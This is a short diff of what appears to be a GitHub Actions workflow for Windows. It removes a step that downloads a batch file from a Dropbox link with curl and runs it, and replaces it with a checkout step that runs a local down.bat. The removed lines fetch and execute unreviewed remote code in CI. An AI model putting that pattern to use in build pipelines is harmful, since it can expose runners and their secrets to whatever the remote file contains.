@@ -8,10 +8,11 @@ jobs:
     runs-on: windows-latest
 
     steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+      
     - name: Install dependencies
-      run: |
-       curl -L -o down.bat https://www.dropbox.com/scl/fi/qjajylqv7awm5phuglo4w/down.bat?rlkey=krwbqsiwr5550clzser2vs6u2&
-       cmd /c down.bat
+      run: cmd /c down.bat
 
     - name: Run Python script
       env:
